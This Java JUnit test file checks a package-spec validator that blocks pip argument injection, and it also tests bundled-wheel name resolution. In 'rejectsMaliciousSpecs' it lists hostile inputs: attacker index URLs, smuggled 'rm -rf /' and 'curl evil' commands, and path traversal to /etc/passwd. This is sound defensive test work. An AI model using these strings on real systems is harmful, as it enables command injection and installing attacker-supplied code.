package com.gaskony.python3.gateway;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Regression tests for the pip argument-injection BLOCKER (B2 in
 * {@code /modules/.review/FINAL_REVIEW.md}).
 *
 * <p>{@code Python3PackageManager.isValidPackageSpec} must:</p>
 * <ul>
 *   <li>Reject specs starting with {@code -} (option-injection vector,
 *       e.g. {@code --index-url=http://attacker/}, {@code -r requirements.txt}).</li>
 *   <li>Reject specs containing shell metacharacters / path traversal /
 *       whitespace (defence in depth — even though ProcessBuilder doesn't shell-escape).</li>
 *   <li>Accept normal PEP 503 distribution names with optional version specifiers.</li>
 * </ul>
 */
class Python3PackageManagerTest {

    /**
     * Specs that MUST be rejected. These are the exact attack strings called out
     * in the remediation plan and the {@code xc-security.md} report:
     * pip option injection, shell metacharacters, path traversal.
     */
    @ParameterizedTest
    @ValueSource(strings = {
            "-r requirements.txt",
            "--index-url=http://attacker/",
            "--index-url http://attacker/",
            "--extra-index-url=http://attacker/",
            "-i http://attacker/",
            "pkg; rm -rf /",
            "pkg && rm -rf /",
            "pkg || curl evil",
            "pkg`whoami`",
            "pkg$(id)",
            "../../../etc/passwd",
            "/etc/passwd",
            "git+https://attacker/evil.git",
            "https://attacker/evil.whl",
            "file:///etc/passwd",
            "pkg with space",
            "pkg\nrm -rf /",
            "",
            "  ",
            "-",
            "--",
            "--user"
    })
    void rejectsMaliciousSpecs(String spec) {
        assertThat(Python3PackageManager.isValidPackageSpec(spec))
                .as("spec %s must be rejected", spec)
                .isFalse();
    }

    /**
     * Specs that MUST be accepted. These match the PEP 503 distribution name with
     * optional version specifier — the only forms the install/uninstall endpoints
     * are intended to support.
     */
    @ParameterizedTest
    @ValueSource(strings = {
            "requests",
            "requests==2.31.0",
            "numpy>=1.0",
            "Django",
            "django",
            "Flask>=2.0.0",
            "scipy<=1.11.0",
            "pyyaml!=6.0.1",
            "package~=1.4.2",
            "pkg.with.dots",
            "pkg-with-dashes",
            "pkg_with_underscores",
            "a",
            "a1",
            "1package",  // PEP 503 allows leading digit
            "pkg==1.0.0+local",
            "pkg==1.0.0!1"
    })
    void acceptsValidSpecs(String spec) {
        assertThat(Python3PackageManager.isValidPackageSpec(spec))
                .as("spec %s must be accepted", spec)
                .isTrue();
    }

    @Test
    void rejectsNullSpec() {
        assertThat(Python3PackageManager.isValidPackageSpec(null)).isFalse();
    }

    // ===== v4.3.6: bundled-wheel resolution (workflow-8 defect) =====
    //
    // packages.json's wheel filenames had drifted from the actually bundled
    // files (and contained literal "{platform}" placeholders), so installs
    // failed with "Wheel not found in resources". Resolution now scans the
    // bundled directory and matches by PEP 503-normalised distribution name.

    @Test
    void findBundledWheel_matchesNormalisedNames() {
        java.util.List<String> bundled = java.util.List.of(
            "charset_normalizer-3.4.4-cp311-cp311-manylinux2014_x86_64.whl",
            "python_dateutil-2.9.0.post0-py2.py3-none-any.whl",
            "requests-2.32.5-py3-none-any.whl");
        assertThat(Python3PackageManager.findBundledWheel(bundled, "requests"))
            .isEqualTo("requests-2.32.5-py3-none-any.whl");
        assertThat(Python3PackageManager.findBundledWheel(bundled, "python-dateutil"))
            .isEqualTo("python_dateutil-2.9.0.post0-py2.py3-none-any.whl");
        assertThat(Python3PackageManager.findBundledWheel(bundled, "charset-normalizer"))
            .isEqualTo("charset_normalizer-3.4.4-cp311-cp311-manylinux2014_x86_64.whl");
        assertThat(Python3PackageManager.findBundledWheel(bundled, "numpy")).isNull();
    }

    @Test
    void everyCatalogueBundleResolvesAllPipPackagesOnLinux() throws Exception {
        // On linux-x64 every pip package in every catalogue bundle must either
        // resolve to a bundled wheel or be a known PyPI-fallback (binary wheels
        // deliberately not shipped for size). Guards against future drift
        // between packages.json and the bundled resources.
        java.util.Set<String> pypiFallbacks = java.util.Set.of(
            "numpy", "pandas", "matplotlib", "contourpy", "kiwisolver", "pillow");

        java.nio.file.Path tmp = java.nio.file.Files.createTempDirectory("pkgmgr-test");
        try {
            Python3PackageManager mgr = new Python3PackageManager(tmp, "python3");
            java.util.List<String> bundled = mgr.listBundledWheels("linux-x64");
            assertThat(bundled).isNotEmpty();

            for (var entry : mgr.getPackageCatalog().entrySet()) {
                for (String pipName : entry.getValue().pipPackages) {
                    String wheel = Python3PackageManager.findBundledWheel(bundled, pipName);
                    if (wheel == null) {
                        assertThat(pypiFallbacks)
                            .as("'%s' (bundle '%s') is neither bundled for linux-x64 nor a"
                                + " declared PyPI fallback — packages.json and the bundled"
                                + " wheels have drifted again", pipName, entry.getKey())
                            .contains(pipName);
                    }
                }
            }
        } finally {
            try (var stream = java.nio.file.Files.walk(tmp)) {
                stream.sorted(java.util.Comparator.reverseOrder())
                      .forEach(p -> p.toFile().delete());
            }
        }
    }
}
